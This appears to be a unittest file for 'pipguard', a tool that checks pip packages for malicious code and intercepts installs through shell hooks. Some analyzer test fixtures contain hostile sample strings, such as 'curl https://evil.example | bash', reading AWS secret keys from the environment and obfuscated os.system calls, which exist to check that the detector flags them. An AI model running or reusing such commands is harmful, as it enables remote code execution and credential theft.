import os
import shutil
import subprocess
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

from pipguard import analyzer, cache, main, pypi, scorer


class AnalyzerTests(unittest.TestCase):
    def test_alias_subprocess_is_flagged(self):
        flags = analyzer._analyze_source(
            'from subprocess import Popen\nPopen(["sh", "-c", "echo pwned"])\n'
        )
        self.assertTrue(flags["shell_exec"])

    def test_env_subscript_and_home_env_are_flagged(self):
        env_flags = analyzer._analyze_source(
            'import os\nsecret = os.environ["AWS_SECRET_ACCESS_KEY"]\n'
        )
        self.assertTrue(env_flags["env_access"])

        home_flags = analyzer._analyze_source(
            'import os\nhome = os.environ["HOME"]\n'
        )
        self.assertTrue(home_flags["home_dir_access"])

    def test_network_alias_and_dynamic_import_are_flagged(self):
        network_flags = analyzer._analyze_source(
            'import urllib.request as u\nu.urlopen("http" + "://evil.example")\n'
        )
        self.assertTrue(network_flags["network_call"])

        dynamic_flags = analyzer._analyze_source(
            '__import__("os").system("echo pwned")\n'
        )
        self.assertTrue(dynamic_flags["dynamic_exec"])
        self.assertTrue(dynamic_flags["shell_exec"])

    def test_getattr_obfuscation_and_pyproject_scan_are_flagged(self):
        getattr_flags = analyzer._analyze_source(
            'import os\ngetattr(os, "sys" + "tem")("curl https://evil.example | bash")\n'
        )
        self.assertTrue(getattr_flags["dynamic_exec"])
        self.assertTrue(getattr_flags["shell_exec"])
        self.assertTrue(getattr_flags["network_call"])

        pyproject_flags = analyzer._analyze_pyproject(
            '[tool.example]\nbootstrap = "curl https://evil.example | bash"\n'
        )
        self.assertTrue(pyproject_flags["network_call"])
        self.assertTrue(pyproject_flags["shell_exec"])

    def test_pyproject_metadata_urls_are_not_flagged_as_network_calls(self):
        flags = analyzer._analyze_pyproject(
            '[project.urls]\nHomepage = "https://example.com"\nDocumentation = "https://docs.example.com"\n'
        )
        self.assertFalse(flags["network_call"])

    def test_pyproject_dependency_urls_remain_flagged(self):
        flags = analyzer._analyze_pyproject(
            '[project]\ndependencies = ["demo @ https://example.com/demo.whl"]\n'
        )
        self.assertTrue(flags["network_call"])


class MainTests(unittest.TestCase):
    def test_split_pinned_package(self):
        self.assertEqual(
            main._split_pinned_package("urllib3==1.25.2", None),
            ("urllib3", "1.25.2"),
        )
        self.assertEqual(
            main._split_pinned_package("urllib3", "1.25.2"),
            ("urllib3", "1.25.2"),
        )

    def test_hook_templates_include_intercept_and_passthrough_logic(self):
        self.assertIn("pipguard install", main.BASH_ZSH_FUNC)
        self.assertIn('command pip install "$@"', main.BASH_ZSH_FUNC)

        self.assertIn("pipguard install", main.FISH_FUNC)
        self.assertIn("command pip install $install_args", main.FISH_FUNC)

        self.assertIn("pipguard install", main.POWERSHELL_FUNC)
        self.assertIn("Source install @installArgs", main.POWERSHELL_FUNC)


class CacheTests(unittest.TestCase):
    def test_clear_vuln_clears_cached_analysis_rows(self):
        original_dir = cache.CACHE_DIR
        original_db = cache.CACHE_DB

        with tempfile.TemporaryDirectory() as tmpdir:
            cache.CACHE_DIR = Path(tmpdir)
            cache.CACHE_DB = cache.CACHE_DIR / "cache.db"

            try:
                cache.set("full:requests:latest", {"ok": True}, cache.TTL_TRUST)
                cache.set("osv:requests:2.0.0", {"ok": True}, cache.TTL_TRUST)
                cache.clear_vuln()

                self.assertIsNone(cache.get("full:requests:latest"))
                self.assertIsNone(cache.get("osv:requests:2.0.0"))
            finally:
                cache.CACHE_DIR = original_dir
                cache.CACHE_DB = original_db


class PyPITests(unittest.TestCase):
    def test_compute_age_days_uses_earliest_release(self):
        releases = {
            "0.1.0": [{"upload_time": "2026-01-01T00:00:00"}],
            "0.2.0": [{"upload_time": "2026-01-03T00:00:00"}],
        }

        age_days = pypi._compute_age_days(
            releases,
            now=datetime(2026, 1, 10, tzinfo=timezone.utc),
        )

        self.assertEqual(age_days, 9)


class ScorerTests(unittest.TestCase):
    def test_dynamic_exec_adds_risk(self):
        breakdown = scorer.compute(
            {"age_days": 365, "github_url": "https://github.com/example/repo"},
            {"spike_pct": None, "last_month": 100000},
            [],
            {
                "network_call": False,
                "env_access": False,
                "home_dir_access": False,
                "shell_exec": False,
                "base64_obfuscation": False,
                "dynamic_exec": True,
            },
            "pure_python",
            "unknown",
        )

        self.assertEqual(breakdown["signals"]["Dynamic execution / obfuscation"], 40)
        self.assertEqual(breakdown["verdict"], "MEDIUM")


class ShellHookRuntimeTests(unittest.TestCase):
    def _write_stub(self, path: Path, name: str):
        path.write_text(
            "#!/bin/sh\n"
            "printf '%s' '" + name + "' >> \"$HOOK_LOG\"\n"
            "for arg in \"$@\"; do\n"
            "  printf '|%s' \"$arg\" >> \"$HOOK_LOG\"\n"
            "done\n"
            "printf '\\n' >> \"$HOOK_LOG\"\n"
        )
        path.chmod(0o755)

    def _setup_runtime_dir(self) -> tuple[Path, Path, dict[str, str]]:
        tempdir = tempfile.TemporaryDirectory()
        self.addCleanup(tempdir.cleanup)

        root = Path(tempdir.name)
        bin_dir = root / "bin"
        bin_dir.mkdir()
        hook_file = root / "hook.sh"
        hook_file.write_text(main.BASH_ZSH_FUNC)
        log_file = root / "hook.log"

        self._write_stub(bin_dir / "pip", "pip")
        self._write_stub(bin_dir / "pipguard", "pipguard")

        env = os.environ.copy()
        env["PATH"] = f"{bin_dir}:{env.get('PATH', '')}"
        env["HOOK_LOG"] = str(log_file)
        return hook_file, log_file, env

    def _run_bash_hook(self, pip_command: str) -> list[str]:
        hook_file, log_file, env = self._setup_runtime_dir()
        result = subprocess.run(
            ["bash", "--noprofile", "--norc", "-lc", f'source "{hook_file}"; {pip_command}'],
            capture_output=True,
            text=True,
            env=env,
            check=False,
        )
        self.assertEqual(result.returncode, 0, msg=result.stderr)
        return log_file.read_text().splitlines()

    def test_bash_hook_intercepts_simple_install(self):
        lines = self._run_bash_hook("pip install idna==3.11")
        self.assertEqual(lines, ["pipguard|install|idna==3.11"])

    def test_bash_hook_passthroughs_common_pip_install_forms(self):
        cases = {
            "pip install --upgrade idna": "pip|install|--upgrade|idna",
            "pip install idna certifi": "pip|install|idna|certifi",
            "pip install -r requirements.txt": "pip|install|-r|requirements.txt",
            "pip install ./dist/demo.whl": "pip|install|./dist/demo.whl",
        }

        for command, expected in cases.items():
            with self.subTest(command=command):
                lines = self._run_bash_hook(command)
                self.assertEqual(lines, [expected])

    def _run_optional_shell(self, shell: str, command: str, hook_content: str) -> list[str]:
        if shutil.which(shell) is None:
            self.skipTest(f"{shell} is not installed")

        tempdir = tempfile.TemporaryDirectory()
        self.addCleanup(tempdir.cleanup)

        root = Path(tempdir.name)
        bin_dir = root / "bin"
        bin_dir.mkdir()
        hook_file = root / f"hook.{shell}"
        hook_file.write_text(hook_content)
        log_file = root / "hook.log"

        self._write_stub(bin_dir / "pip", "pip")
        self._write_stub(bin_dir / "pipguard", "pipguard")

        env = os.environ.copy()
        env["PATH"] = f"{bin_dir}:{env.get('PATH', '')}"
        env["HOOK_LOG"] = str(log_file)

        if shell == "fish":
            args = [shell, "--private", "-c", f'source "{hook_file}"; {command}']
        else:
            args = [shell, "-NoProfile", "-Command", f'. "{hook_file}"; {command}']

        result = subprocess.run(args, capture_output=True, text=True, env=env, check=False)
        self.assertEqual(result.returncode, 0, msg=result.stderr)
        return log_file.read_text().splitlines()

    def test_fish_hook_runtime_if_available(self):
        lines = self._run_optional_shell("fish", "pip install requests", main.FISH_FUNC)
        self.assertEqual(lines, ["pipguard|install|requests"])

    def test_powershell_hook_runtime_if_available(self):
        shell = "pwsh" if shutil.which("pwsh") else "powershell"
        lines = self._run_optional_shell(shell, "pip install requests", main.POWERSHELL_FUNC)
        self.assertEqual(lines, ["pipguard|install|requests"])


if __name__ == "__main__":
    unittest.main()
